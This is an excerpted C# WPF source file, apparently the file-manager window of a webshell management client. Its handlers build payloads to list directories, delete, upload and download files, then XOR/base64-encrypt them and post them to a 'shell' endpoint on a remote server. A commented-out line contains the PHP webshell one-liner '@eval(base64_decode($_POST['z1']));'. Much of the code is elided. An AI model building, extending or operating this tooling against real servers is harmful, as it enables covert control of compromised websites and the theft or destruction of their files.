...
namespace WpfApp1.UI 
{
    ...
    public partial class FileList : Window
    {
        ...
        public void pan()
        {
            string pay = filePayload.FIleDrive();
           ...
           // string z2 = z1 + "&z1=" + pay;
            ...
            string resp = Utli.XorPost.Post(shell, xor_base64_encrypt);
            string xor_base64_decrypt = Utli.xor_base64.Decrypt(resp);

            xor_base64_decrypt = xor_base64_decrypt.Trim(); ;
            string[] p = xor_base64_decrypt.Split(':');
        ...
        private void Folder_Expanded(object sender, RoutedEventArgs e)
        {
            ...
            try
            {
                ...
                string dirs = filePayload.FileDir(encrypt.EncodeBase64("utf-8", fullPath));
                string xor_base64_encrypt = Utli.xor_base64.Encrypt(dirs);
                string resp = Utli.XorPost.Post(shell, xor_base64_encrypt);
                string xor_base64_decrypt = Utli.xor_base64.Decrypt(resp);

                //解析 json 数据
                JArray lstRole = (JArray)JsonConvert.DeserializeObject(xor_base64_decrypt);
                if (lstRole== null )
                {
        ...
        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            ...
            try
            {
               ...
               /* string D = String.Format("$D=\"{0}\";", textPath.Text);
                ...
                string dirs = filePayload.FileDir(encrypt.EncodeBase64("utf-8", textPath.Text));
                string xor_base64_encrypt = Utli.xor_base64.Encrypt(dirs);
                string resp = Utli.XorPost.Post(shell, xor_base64_encrypt);
                string xor_base64_decrypt = Utli.xor_base64.Decrypt(resp);
        ...
        private void Button_Click(object sender, RoutedEventArgs e)
        {
            ...
            {
                System.Windows.MessageBox.Show("ERROR:// Path Not Found Or No Permission!");
            }
        ...
        private void Deletefile_Click(object sender, RoutedEventArgs e)
        {
            ...
            if (listData != null && listData is FileListData)
            {
                if (listData.path.Contains("/") == true)
                {
                    ...
                    System.Windows.MessageBox.Show(listData.path);
                }
                else
                {
                    string messageBoxText = String.Format("确定删除文件{0}吗?", listData.path);
                    MessageBoxResult result = System.Windows.MessageBox.Show(messageBoxText, "删除文件", MessageBoxButton.YesNo, MessageBoxImage.Error);
                    if (result == MessageBoxResult.Yes)
                    {
                       ...
                       /* string z1 = "@eval(base64_decode($_POST['z1']));";
                        ...
                        string pathroot = filePayload.DelFile(encrypt.EncodeBase64("utf-8", path));
                        string xor_base64_encrypt = Utli.xor_base64.Encrypt(pathroot);
                        string resp = Utli.XorPost.Post(shell, xor_base64_encrypt);
                        string xor_base64_decrypt = Utli.xor_base64.Decrypt(resp);
        ...
        private void UploadFiles_Click(object sender, RoutedEventArgs e)
        {
            ...
            if(result == true)
            {
                ...
                string pathroot = filePayload.UploadFile(BasePath,content);
                string xor_base64_encrypt = Utli.xor_base64.Encrypt(pathroot);
                string resp = Utli.XorPost.Post(shell, xor_base64_encrypt);
                string xor_base64_decrypt = Utli.xor_base64.Decrypt(resp);
                ...
                {
                    System.Windows.MessageBox.Show("文件上传失败！");
                }
        ...
        private void Dowfile_Click(object sender, RoutedEventArgs e)
        {
            ...
            if (result == true)
            {
                ...
                {
                    System.Windows.MessageBox.Show("文件保存异常！");
                }
